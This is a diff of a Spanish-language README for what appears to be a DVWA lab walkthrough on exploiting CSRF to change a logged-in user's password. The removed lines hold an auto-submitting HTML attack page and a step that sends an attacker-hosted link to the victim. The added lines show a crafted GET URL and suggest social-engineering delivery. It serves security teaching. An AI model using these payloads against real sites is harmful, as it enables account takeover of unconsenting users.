@@ -6,7 +6,7 @@ En este repositorio se explica cómo explotar la vulnerabilidad **CSRF (Cross Si
 
 ## 🎯 Objetivo
 
-Realizar un ataque CSRF para cambiar la contraseña de un usuario autenticado sin su consentimiento, aprovechando la ausencia o debilidad de protecciones en el formulario vulnerable.
+Realizar un ataque CSRF para **cambiar la contraseña de un usuario autenticado sin su consentimiento**, aprovechando la ausencia o debilidad de protecciones en el formulario vulnerable. Esto se puede lograr mediante técnicas de ingeniería social como enviar un enlace por email o redirigir a la víctima a una página maliciosa.
 
 ---
 
@@ -14,38 +14,44 @@ Realizar un ataque CSRF para cambiar la contraseña de un usuario autenticado si
 
 ### 🧪 Vulnerabilidad detectada
 - No hay validación de origen ni token CSRF.
-- Es posible realizar el ataque simplemente cargando una página maliciosa en el navegador de la víctima mientras está autenticada.
+- El código fuente `low.php` acepta peticiones GET directamente sin verificar el origen ni incluir ningún token de seguridad.
+- Además, al inspeccionar el botón Test Credentials, se observa un script que abre una ventana con `test_credentials.php`, útil para comprobar si la contraseña ha sido modificada.
+- Usando `Burp Suite`, es posible interceptar y observar una petición GET.
 
 ### 🛠 Paso a paso
 
-1. Crear un archivo llamado `csrf.html` con el siguiente contenido:
+1. Inspeccionamos el elemento desde el apartado de CSRF y vemos que el botón **Test Credentials** ejecuta un script, el cual verifica si la contraseña se ha cambiado correctamente.
+
+![Inspeccionar_Elemento](assets/CSRFL_Inspeccionar.png) 
+   
+2. Damos click en **Test Credentials** y vemos que podemos comprobar la contraseña del usuario *admin* y su contraseña por defecto *password*.
+
+![Test_Credentials](assets/CSRFL_TestCredentials.png) 
+
+3. Cambiamos la contraseña, introduciendo esta dos veces, y damos click en **Change**.
+4. Vemos con la herramienta **Burp Suite** que en la petición GET podemos ver una URL desde donde se puede cambiar la contraseña.
+```php
+GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
+```
 
 ```html
-<html>
-  <body>
-    <script>history.pushState('', '', '/')</script>
-    <form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
-      <input type="hidden" name="password_new" value="nuevacontra" />
-      <input type="hidden" name="password_conf" value="nuevacontra" />
-      <input type="hidden" name="Change" value="Change" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
 ```
 
-2. Levantar un servidor HTTP simple:
+![Cambio_contraseña](assets/CSRFL_GETChange.png) 
 
-```bash
-python3 -m http.server 80
-```
+5. Copiamos esta URL y la pegamos sobre nuestro navegador.
 
-3. Enviar el enlace al archivo (por ejemplo `http://attacker-ip/csrf.html`) a la víctima autenticada.
+![Copiar_URL](assets/CSRFL_URL.png) 
 
-4. Al visitar el enlace, la contraseña se cambiará automáticamente.
+6. Realizamos cambios de la contraseña a *test123* desde la URL.
+
+![Cambiar_contraseña_URL](assets/CSRFL_URLv2.png) 
+
+7. Comprobamos que esta contraseña ha sido cambiada al haber modificado la URL y accedido al sitio web.
+
+![Comprobar_contraseña](assets/CSRFL_test123.png) 
+
 
 ✅ **Exploit exitoso**: la contraseña cambia sin interacción del usuario.
 
